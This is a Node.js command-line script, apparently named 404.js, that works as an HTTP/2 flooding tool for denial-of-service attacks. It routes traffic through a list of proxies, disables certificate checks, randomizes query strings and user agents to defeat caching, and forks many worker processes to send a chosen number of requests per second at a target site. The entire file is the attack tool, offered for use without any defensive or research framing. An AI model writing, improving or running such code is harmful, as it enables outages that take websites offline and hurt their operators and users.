import fs from 'fs';
import net from 'net';
import http2 from 'http2';
import tls from 'tls';
import cluster from 'cluster';
import url from 'url';
import crypto from 'crypto';
import axios from 'axios';
import gradient from 'gradient-string';

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', (err) => {
  console.error('Unhandled Exception:', err);
});

if (process.argv.length < 7) {
  console.log(
    gradient.vice(`[!] Usage: node 404.js <HOST> <TIME> <RPS> <THREADS> <PROXY_FILE>.`)
  );
  process.exit(1);
}

// Helper Functions
function readLines(filePath) {
  return fs.readFileSync(filePath, 'utf-8').split(/\r?\n/).filter((line) => line.trim());
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomInt(0, elements.length)];
}

function randStr(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  return Array.from({ length }, () =>
    characters.charAt(randomInt(0, characters.length))
  ).join('');
}

const ipSpoof = () => `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`;

// Command-Line Arguments
const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3], 10),
  rps: parseInt(process.argv[4], 10),
  threads: parseInt(process.argv[5], 10),
  proxyFile: process.argv[6],
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (!proxies.length) {
  console.error('Proxy file is empty or invalid.');
  process.exit(1);
}

// HTTP Flooder
function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const [proxyHost, proxyPort] = proxyAddr.split(':');

  const headers = {
    ':method': 'GET',
    ':path': `${parsedTarget.path}?${randStr(5)}=${randStr(10)}`,
    ':authority': parsedTarget.host,
    ':scheme': 'https',
    'user-agent': randomElement([
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14)',
      'Mozilla/5.0 (Linux; Android 10)',
    ]),
    referer: `https://${parsedTarget.host}`,
    accept: 'text/html,application/xhtml+xml',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
  };

  const proxyOptions = {
    host: proxyHost,
    port: parseInt(proxyPort, 10),
    timeout: 100,
  };

  const netSocket = new net.Socket();
  netSocket.connect(proxyOptions, () => {
    const payload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n\r\n`;
    netSocket.write(payload);
  });

  netSocket.on('data', (chunk) => {
    if (!chunk.toString().includes('200 Connection established')) {
      netSocket.destroy();
      return;
    }

    const tlsConnection = tls.connect({
      host: parsedTarget.host,
      port: 443,
      socket: netSocket,
      rejectUnauthorized: false,
    });

    const client = http2.connect(`https://${parsedTarget.host}`, {
      createConnection: () => tlsConnection,
    });

    client.on('connect', () => {
      setInterval(() => {
        for (let i = 0; i < args.rps; i++) {
          const request = client.request(headers);
          request.end();
        }
      }, 1000);
    });

    client.on('close', () => client.destroy());
    tlsConnection.on('close', () => tlsConnection.destroy());
  });

  netSocket.on('error', () => netSocket.destroy());
}

if (cluster.isMaster) {
  console.log(gradient.vice(`[!] Starting ${args.threads} threads...`));
  for (let i = 0; i < args.threads; i++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder, 1000);
}

// Auto-stop after time limit
setTimeout(() => process.exit(0), args.time * 1000);
